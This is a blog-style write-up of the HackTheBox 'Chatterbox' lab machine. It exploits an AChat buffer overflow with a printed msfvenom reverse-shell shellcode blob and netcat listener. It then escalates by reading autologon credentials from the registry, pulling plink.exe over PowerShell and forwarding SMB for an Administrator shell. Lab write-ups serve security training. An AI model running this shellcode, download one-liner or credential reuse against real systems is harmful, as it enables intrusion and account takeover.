---
layout: post
title: HackTheBox - Chatterbox Writeup
tags: [hackthebox]
---

## Enumeration

Chatterbox is a pretty simple box and reminds me a lot of something you run across in the OSCP labs. Overall it's pretty easy, the only sort of tricky part is with privesc if you aren't familiar with port forwarding. If you follow my Windows Privilege Escalation Guide on this one, you'll be golden. Before you do the box, make sure you've reset it otherwise you won't get a shell. 


```
root@kali:~/htb/chatterbox# nmap -sV -p- 10.10.10.74 -T4

Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-02 15:16 EST
Nmap scan report for 10.10.10.74
Host is up (0.050s latency).

PORT     STATE SERVICE VERSION
9255/tcp open  http    AChat chat system httpd
9256/tcp open  achat   AChat chat system

Nmap done: 1 IP address (1 host up)
```

Looks like AChat is our target. A quick Google returns an exploit in python:

https://www.exploit-db.com/exploits/36025/

The exploit payload is currently only going to run calc.exe, so we'll need to generate a reverse shellcode payload. We can do this with `msfvenom`. Lucky for us the author of the exploit was nice enough to specify his exact command used in the comments, so we know the correct options along with which bad characters to exclude.

```
root@kali:~/htb/chatterbox# msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/unicode_mixed
x86/unicode_mixed succeeded with size 774 (iteration=0)
x86/unicode_mixed chosen with final size 774
Payload size: 774 bytes
Final size of python file: 3706 bytes
buf =  ""
buf += "\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += "\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += "\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += "\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += "\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += "\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += "\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += "\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += "\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += "\x47\x42\x39\x75\x34\x4a\x42\x59\x6c\x67\x78\x45\x32"
buf += "\x4b\x50\x39\x70\x79\x70\x63\x30\x52\x69\x47\x75\x6e"
buf += "\x51\x75\x70\x42\x44\x34\x4b\x42\x30\x4e\x50\x34\x4b"
buf += "\x52\x32\x4c\x4c\x42\x6b\x62\x32\x4b\x64\x32\x6b\x62"
buf += "\x52\x6d\x58\x4a\x6f\x74\x77\x6e\x6a\x6b\x76\x4c\x71"
buf += "\x6b\x4f\x76\x4c\x6d\x6c\x4f\x71\x51\x6c\x6d\x32\x4e"
buf += "\x4c\x4b\x70\x79\x31\x36\x6f\x6c\x4d\x4d\x31\x79\x37"
buf += "\x57\x72\x49\x62\x4e\x72\x6e\x77\x32\x6b\x42\x32\x4e"
buf += "\x30\x64\x4b\x4e\x6a\x6d\x6c\x72\x6b\x30\x4c\x4c\x51"
buf += "\x52\x58\x57\x73\x61\x38\x69\x71\x66\x71\x50\x51\x74"
buf += "\x4b\x52\x39\x6f\x30\x69\x71\x79\x43\x54\x4b\x31\x39"
buf += "\x5a\x78\x6b\x33\x4c\x7a\x61\x39\x42\x6b\x6d\x64\x32"
buf += "\x6b\x79\x71\x67\x66\x30\x31\x59\x6f\x54\x6c\x36\x61"
buf += "\x78\x4f\x6a\x6d\x6b\x51\x67\x57\x4f\x48\x37\x70\x72"
buf += "\x55\x48\x76\x7a\x63\x43\x4d\x5a\x58\x4d\x6b\x63\x4d"
buf += "\x6f\x34\x31\x65\x69\x54\x50\x58\x34\x4b\x4f\x68\x4d"
buf += "\x54\x6b\x51\x76\x73\x33\x36\x52\x6b\x6c\x4c\x30\x4b"
buf += "\x62\x6b\x4e\x78\x6b\x6c\x69\x71\x58\x53\x34\x4b\x4b"
buf += "\x54\x54\x4b\x39\x71\x58\x50\x43\x59\x4d\x74\x4b\x74"
buf += "\x6f\x34\x61\x4b\x61\x4b\x50\x61\x51\x49\x50\x5a\x32"
buf += "\x31\x49\x6f\x37\x70\x51\x4f\x71\x4f\x4e\x7a\x34\x4b"
buf += "\x6c\x52\x4a\x4b\x62\x6d\x71\x4d\x71\x58\x6f\x43\x6f"
buf += "\x42\x69\x70\x4b\x50\x43\x38\x61\x67\x50\x73\x30\x32"
buf += "\x71\x4f\x52\x34\x52\x48\x50\x4c\x73\x47\x6b\x76\x39"
buf += "\x77\x6b\x4f\x77\x65\x68\x38\x54\x50\x49\x71\x69\x70"
buf += "\x69\x70\x4b\x79\x46\x64\x72\x34\x30\x50\x61\x58\x6e"
buf += "\x49\x71\x70\x32\x4b\x4b\x50\x49\x6f\x39\x45\x4e\x70"
buf += "\x4e\x70\x4e\x70\x32\x30\x6d\x70\x42\x30\x6d\x70\x50"
buf += "\x50\x70\x68\x5a\x4a\x4a\x6f\x39\x4f\x49\x50\x59\x6f"
buf += "\x37\x65\x63\x67\x71\x5a\x6b\x55\x33\x38\x6a\x6a\x59"
buf += "\x7a\x6a\x6e\x4b\x57\x30\x68\x5a\x62\x69\x70\x59\x71"
buf += "\x35\x6b\x55\x39\x67\x76\x4f\x7a\x6c\x50\x51\x46\x51"
buf += "\x47\x31\x58\x44\x59\x37\x35\x44\x34\x71\x51\x69\x6f"
buf += "\x7a\x35\x52\x65\x69\x30\x33\x44\x6c\x4c\x79\x6f\x30"
buf += "\x4e\x69\x78\x34\x35\x4a\x4c\x62\x48\x6c\x30\x38\x35"
buf += "\x54\x62\x62\x36\x4b\x4f\x5a\x35\x4f\x78\x31\x53\x50"
buf += "\x6d\x51\x54\x4b\x50\x72\x69\x49\x53\x30\x57\x32\x37"
buf += "\x62\x37\x4c\x71\x6a\x56\x30\x6a\x5a\x72\x70\x59\x72"
buf += "\x36\x6b\x32\x79\x6d\x6f\x76\x76\x67\x50\x44\x6f\x34"
buf += "\x6d\x6c\x6d\x31\x49\x71\x72\x6d\x6d\x74\x4f\x34\x6c"
buf += "\x50\x37\x56\x69\x70\x4d\x74\x6e\x74\x30\x50\x50\x56"
buf += "\x6e\x76\x32\x36\x6e\x66\x32\x36\x50\x4e\x50\x56\x52"
buf += "\x36\x52\x33\x42\x36\x72\x48\x72\x59\x56\x6c\x4f\x4f"
buf += "\x53\x56\x69\x6f\x49\x45\x55\x39\x49\x50\x4e\x6e\x32"
buf += "\x36\x51\x36\x6b\x4f\x4e\x50\x53\x38\x4b\x58\x54\x47"
buf += "\x4b\x6d\x4f\x70\x69\x6f\x68\x55\x37\x4b\x7a\x50\x75"
buf += "\x65\x64\x62\x72\x36\x71\x58\x43\x76\x44\x55\x45\x6d"
buf += "\x55\x4d\x69\x6f\x39\x45\x4f\x4c\x6d\x36\x73\x4c\x79"
buf += "\x7a\x65\x30\x69\x6b\x67\x70\x74\x35\x49\x75\x67\x4b"
buf += "\x4d\x77\x5a\x73\x30\x72\x62\x4f\x30\x6a\x49\x70\x6e"
buf += "\x73\x69\x6f\x47\x65\x41\x41"

```

We can go ahead and edit the exploit with our newly generated shellcode. Start up a netcat listener and run our exploit. 

```
root@kali:~/htb/chatterbox# python 36025.py 
---->{P00F}!
```

```
root@kali:~# nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.74] 49157
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
chatterbox\alfred

```

## Privilege Escalation

After running through some basic privilege escalation enumeration ([ahem](https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/)) we find some credentials in the registry for autologon.

```
C:\Windows\Panther>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
    DefaultDomainName    REG_SZ
    DefaultUserName    REG_SZ    Alfred
    DefaultPassword    REG_SZ    Welcome1!
```

It's possible that password reuse may be at play here for the Administrator. To exploit this we'll need to open up SMB on our target. We can do this by uploading `plink.exe` to our target and port forwarding over port 445.

First we start up our python http server.

```
root@kali:~/htb/chatterbox# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

Next we'll download `plink.exe` using a powershell one liner.

```
C:\Users\Alfred>powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.8/plink.exe', 'plink.exe')"
```

Start SSH service on our attacking box.

```
root@kali:~/htb/chatterbox# service ssh start
```

And run `plink.exe` from our target to forward the port over SSH.

```
C:\Users\Alfred>plink.exe -l root -pw  -R 445:127.0.0.1:445 10.10.14.8
The server's host key is not cached in the registry. You
have no guarantee that the server is the computer you
think it is.
The server's rsa2 key fingerprint is:
ssh-rsa 2048 fc:4d:bc:2f:51:41:40:0d:2e:e2:86:a6:06:fb:98:88
If you trust this host, enter "y" to add the key to
PuTTY's cache and carry on connecting.
If you want to carry on connecting just once, without
adding the key to the cache, enter "n".
If you do not trust this host, press Return to abandon the
connection.
Store key in cache? (y/n) y


The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Aug 10 09:31:17 2017 from 10.10.10.43

root@kali:~# 
```

We can verify the port forward is working with `netstat`.

```
root@kali:~/htb/chatterbox# netstat -ano | grep 445
tcp        0      0 127.0.0.1:445           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp6       0      0 ::1:445                 :::*                    LISTEN      off (0.00/0/0)
```

Excellent. Now let's use `winexe` to get a shell.

```
root@kali:~/htb/chatterbox# winexe -U Administrator //127.0.0.1 "cmd.exe"
Enter password:
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
chatterbox\administrator
```

Success! 